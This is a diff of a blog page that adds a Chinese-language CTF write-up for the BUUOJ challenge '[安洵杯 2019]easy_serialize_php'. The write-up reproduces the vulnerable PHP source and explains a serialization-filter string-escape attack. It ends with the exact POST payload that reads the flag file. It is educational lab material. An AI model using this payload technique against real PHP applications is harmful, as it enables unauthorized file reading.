@@ -69,6 +69,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-安洵杯-2019-easy-serialize-php-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/" class="article-date">
+  <time class="dt-published" datetime="2025-02-02T10:28:28.000Z" itemprop="datePublished">2025-02-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/">[安洵杯 2019]easy_serialize_php 1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>首先进入环境，看到source_code，进入发现代码。<br>&lt;?php</p>
+<p>$function &#x3D; @$_GET[‘f’];</p>
+<p>function filter($img){<br>    $filter_arr &#x3D; array(‘php’,’flag’,’php5’,’php4’,’fl1g’);<br>    $filter &#x3D; ‘&#x2F;‘.implode(‘|’,$filter_arr).’&#x2F;i’;<br>    return preg_replace($filter,’’,$img);<br>}</p>
+<p>if($_SESSION){<br>    unset($_SESSION);<br>}</p>
+<p>$_SESSION[“user”] &#x3D; ‘guest’;<br>$_SESSION[‘function’] &#x3D; $function;</p>
+<p>extract($_POST);</p>
+<p>if(!$function){<br>    echo ‘<a href="index.php?f=highlight_file">source_code</a>‘;<br>}</p>
+<p>if(!$_GET[‘img_path’]){<br>    $_SESSION[‘img’] &#x3D; base64_encode(‘guest_img.png’);<br>}else{<br>    $_SESSION[‘img’] &#x3D; sha1(base64_encode($_GET[‘img_path’]));<br>}</p>
+<p>$serialize_info &#x3D; filter(serialize($_SESSION));</p>
+<p>if($function &#x3D;&#x3D; ‘highlight_file’){<br>    highlight_file(‘index.php’);<br>}else if($function &#x3D;&#x3D; ‘phpinfo’){<br>    eval(‘phpinfo();’); &#x2F;&#x2F;maybe you can find something in here!<br>}else if($function &#x3D;&#x3D; ‘show_image’){<br>    $userinfo &#x3D; unserialize($serialize_info);<br>    echo file_get_contents(base64_decode($userinfo[‘img’]));<br>}<br>进行代码审计，</p>
+<p>$function &#x3D; @$_GET[‘f’];</p>
+<p>function filter($img){<br>    $filter_arr &#x3D; array(‘php’,’flag’,’php5’,’php4’,’fl1g’);<br>    $filter &#x3D; ‘&#x2F;‘.implode(‘|’,$filter_arr).’&#x2F;i’;<br>    return preg_replace($filter,’’,$img);<br>}</p>
+<p>if($_SESSION){<br>    unset($_SESSION);<br>}<br>mplode() 函数返回一个由数组元素组合成的字符串<br>preg_replace 函数执行一个正则表达式的搜索和替换。<br>将敏感字符（‘php’,‘flag’,‘php5’,‘php4’,‘fl1g’）替换成 空格</p>
+<p>可以看得到有执行phpinfo()的语句，尝试调用，然后搜索flag相关的内容，没有结果，在搜索f1ag相关的内容<br>得到了flag文件的名字。d0g3_flag.php.<br>我们主要用到的就这一句</p>
+<p>echo file_get_contents(base64_decode($userinfo[‘img’]));<br>lag和php是敏感字符，在使用的时候被过滤掉了，但序列化记录的字符串长度没有过滤掉，所以在序列化的时候<br>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”2”;}被当作了原来的value<br>在 echo file_get_contents(base64_decode($userinfo[‘img’]));实现了读取flag的，目的<br>实现了逃逸<br>在url中输入<a target="_blank" rel="noopener" href="http://b363f559-5fb2-41f5-ac12-03f253d347d6.node5.buuoj.cn:81/index.php?f=show_image">http://b363f559-5fb2-41f5-ac12-03f253d347d6.node5.buuoj.cn:81/index.php?f=show_image</a></p>
+<p>将&#x2F;d0g3_fllllllag进行base64编码后上传，可获得 flag<br>_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;s:1:”1”;s:1:”2”;}<br>便可得到flag&#x3D; flag{a925d937-3544-40a5-a7e8-4b8c9af9e50b} </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/" data-id="cm6niagmt0000g8x12txz6lgj" data-title="[安洵杯 2019]easy_serialize_php 1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-‘【文件上传WAF绕过】’" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/01/%E2%80%98%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0WAF%E7%BB%95%E8%BF%87%E3%80%91%E2%80%99/" class="article-date">
@@ -603,6 +657,10 @@ static class MyObject implements Serializable &#123;
       <ul>
         
           <li>
+            <a href="/2025/02/02/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-1/">[安洵杯 2019]easy_serialize_php 1</a>
+          </li>
+        
+          <li>
             <a href="/2025/02/01/%E2%80%98%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0WAF%E7%BB%95%E8%BF%87%E3%80%91%E2%80%99/">‘【文件上传WAF绕过】’</a>
           </li>
         
@@ -616,10 +674,6 @@ static class MyObject implements Serializable &#123;
         
           <li>
             <a href="/2025/01/24/MD5%E7%A2%B0%E6%92%9E/">MD5碰撞</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/19/Zer0pts2020-Can-you-guess-it/">[Zer0pts2020]Can you guess it?</a>
           </li>
         
       </ul>
